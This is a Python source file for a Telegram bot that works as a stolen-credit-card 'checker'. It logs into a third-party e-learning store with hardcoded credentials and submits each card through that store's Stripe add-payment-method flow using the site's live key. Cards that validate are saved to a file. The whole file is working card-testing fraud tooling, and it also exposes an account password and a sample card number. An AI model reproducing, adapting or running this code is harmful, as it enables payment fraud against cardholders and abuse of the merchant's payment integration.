import base64
import httpx
import random
import time
import json
import uuid
import os
import asyncio
from defs import *  # Pastikan charge_resp ada dan berfungsi
import re
from html import unescape
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

def gets(s: str, start: str, end: str) -> str | None:
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
    try:
        cc, mes, ano, cvv = fullz.split("|")

        headers1 = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/members/parael10/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        # Ambil token login
        response = await session.get('https://elearntsg.com/login/', headers=headers1)

        login_token = gets(response.text, '"learndash-login-form" value="', '" />')
        if not login_token:
            return "Failed to get login token"

        # Login
        headers2 = headers1.copy()
        headers2.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/login/',
        })

        data_login = {
            'learndash-login-form': login_token,
            'pmpro_login_form_used': '1',
            'log': 'senryph@gmail.com',   # Ganti sesuai login yang sesuai
            'pwd': 'Senryph',               # Ganti password yang sesuai
            'wp-submit': 'Log In',
            'redirect_to': '',
        }

        response = await session.post('https://elearntsg.com/wp-login.php', headers=headers2, data=data_login)

        # Navigasi halaman sesuai flow
        for url in [
            'https://elearntsg.com/activity-feed/',
            'https://elearntsg.com/my-account/payment-methods/',
            'https://elearntsg.com/my-account/add-payment-method/'
        ]:
            response = await session.get(url, headers=headers1)

        nonce = gets(response.text, '"add_card_nonce":"', '"')
        if not nonce:
            return "Failed to get add_card_nonce"

        # Stripe create payment method
        headers_stripe = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data_stripe = {
            'type':'card',
            'billing_details[name]':'parael senoman',
            'billing_details[email]':'parael10@gmail.com',
            'card[number]': f'{cc}',
            'card[cvc]': f'{cvv}',
            'card[exp_month]': f'{mes}',
            'card[exp_year]': f'{ano}',
            'guid':'6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90',
            'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
            'sid':'6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
            'payment_user_agent':'stripe.js/983ed40936; stripe-js-v3/983ed40936; split-card-element',
            'referrer':'https://elearntsg.com',
            'time_on_page':'146631',
            'client_attribution_metadata[client_session_id]':'026b4312-1f75-4cd9-a40c-456a8883e56c',
            'client_attribution_metadata[merchant_integration_source]':'elements',
            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
            'client_attribution_metadata[merchant_integration_version]':'2017',
            'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
        }

        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)

        try:
            id = response.json()['id']
        except Exception:
            return response.text

        # Kirim payment method ke server untuk setup intent
        headers_ajax = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data_ajax = {
            'stripe_source_id': id,
            'nonce': nonce,
        }

        response = await session.post('https://elearntsg.com/', params=params, headers=headers_ajax, data=data_ajax)

        return response.text

    except Exception as e:
        return f"Exception: {str(e)}"

async def multi_checking(fullz: str) -> str:
    start = time.time()
    async with httpx.AsyncClient(timeout=40) as session:
        result = await create_payment_method(fullz, session)
        response = await charge_resp(result)  # Pastikan fungsi ini kompatibel

    elapsed = round(time.time() - start, 2)

    error_message = ""
    try:
        json_resp = json.loads(result)
        if "error" in json_resp:
            error_message = unescape(json_resp["error"].get("message", "")).strip()
    except Exception:
        pass

    if error_message:
        output = (
            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
        )
    else:
        output = (
            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
        )
        if any(key in response for key in ["Payment method successfully added", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
            with open("auth.txt", "a", encoding="utf-8") as file:
                file.write(output + "\n")

    return output

# Telegram bot handlers

TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")  # Ganti token asli kamu ya

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
        "CC|MM|YYYY|CVV\n"
        "4693080257546198|12|29|590\n"
        "4693080257546198|12|2029|590"
    )

async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = update.message.text.strip()
    lines = [line.strip() for line in text.splitlines() if line.strip()]

    msg = await update.message.reply_text("STARTING CARD CHECKS... PLEASE WAIT.", parse_mode='HTML')

    try:
        for line in lines:
            parts = line.split("|")
            if len(parts) != 4:
                await update.message.reply_text(
                    f"WRONG FORMAT:\n<code>{line}</code>\nGunakan format CC|MM|YYYY|CVV",
                    parse_mode='HTML'
                )
                continue

            cc_num, month, year, cvv = parts
            if len(year) == 4:
                year = year[-2:]

            cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"

            # Optional sleep jika mau beri delay (hapus jika mau cek lebih cepat)
            await asyncio.sleep(3)

            result = await multi_checking(cc_formatted)
            await update.message.reply_text(result, parse_mode='HTML')

        await msg.delete()
    except Exception as e:
        await update.message.reply_text(f"ERROR: {str(e)}")

def main() -> None:
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))

    print("PARAEL CHECKER...")
    application.run_polling()

if __name__ == "__main__":
    main()
